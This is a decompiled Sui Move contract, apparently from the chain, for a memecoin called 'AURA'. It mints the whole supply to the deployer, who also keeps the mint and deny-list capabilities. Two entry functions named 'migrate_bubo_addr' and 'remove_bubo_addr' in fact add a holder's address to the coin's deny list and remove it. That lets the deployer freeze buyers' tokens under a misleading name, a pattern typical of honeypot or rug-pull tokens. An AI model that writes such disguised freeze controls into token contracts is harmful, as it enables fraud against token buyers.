module 0x4e9f7783ce3a050cc611fde193fe9a3025d345d48d3098a03b5bc4343fbf919e::AURA {
    struct AURA has drop {
        dummy_field: bool,
    }

    fun init(arg0: AURA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AURA>(arg0, 6, b"AURA", b"Sui Aura", b"Sui's aura is insane right now, let's keep the momentum lock in $AURA", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://movepump.com/_next/image?url=https%3A%2F%2Fapi.movepump.com%2Fuploads%2FPfp_38d1d1a791.png&w=640&q=75")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AURA>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<AURA>>(0x2::coin::mint<AURA>(&mut v3, 10000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<AURA>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AURA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun migrate_bubo_addr(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AURA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AURA>(arg0, arg1, arg2, arg3);
    }

    public entry fun remove_bubo_addr(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AURA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<AURA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

